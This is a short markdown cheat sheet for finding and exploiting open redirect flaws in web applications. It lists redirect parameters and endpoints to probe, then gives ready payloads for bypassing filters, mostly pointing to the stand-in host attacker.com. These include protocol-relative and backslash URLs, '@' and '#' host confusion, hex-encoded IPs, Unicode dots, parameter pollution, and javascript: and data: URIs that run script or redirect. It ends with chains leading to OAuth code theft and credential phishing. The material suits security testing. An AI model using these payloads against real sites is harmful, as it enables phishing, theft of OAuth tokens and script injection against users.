# Open Redirect Reference

## Attack Surface Signals
- Parameters handling navigation/redirection: `url`, `redirect`, `next`, `return`, `return_to`, `dest`, `destination`, `go`, `target`, `r`, `u`.
- Endpoints: `/login?next=`, `/logout?redirect=`, `/oauth/authorize?redirect_uri=`.

## Filter Bypasses & Variations
1. **Slash & Protocol Variations**:
   - Protocol-relative: `//attacker.com`, `///attacker.com`, `\attacker.com`, `\/\/attacker.com`.
   - Slashes in path: `https://victim.com/redirect?url=/attacker.com`.
2. **Domain / Host Spoofing**:
   - Subdomain tricks: `https://victim.com.attacker.com`
   - Authority delimiter confusion: `https://victim.com@attacker.com`, `https://attacker.com#victim.com`.
   - Dot-less IP / Unicode encoding: `http://0xd83ad9e7`, `https://attacker。com`.
3. **Parameter Pollution & Nested Parameters**:
   - `?url=https://victim.com&url=https://attacker.com`
   - `?redirect_uri=https://victim.com/login?next=https://attacker.com`
4. **JavaScript / Data URI Schemes**:
   - `javascript:alert(document.domain)` (escalates open redirect to XSS).
   - `data:text/html,<script>window.location='https://attacker.com'</script>`.

## Exploit Chains
- **Open Redirect + OAuth Authorization → OAuth Token Theft**: Chaining open redirect on whitelisted domain to leak OAuth authorization code.
- **Open Redirect → Credential Phishing**: Using legitimate domain redirect to trick users into trusting fake login pages.
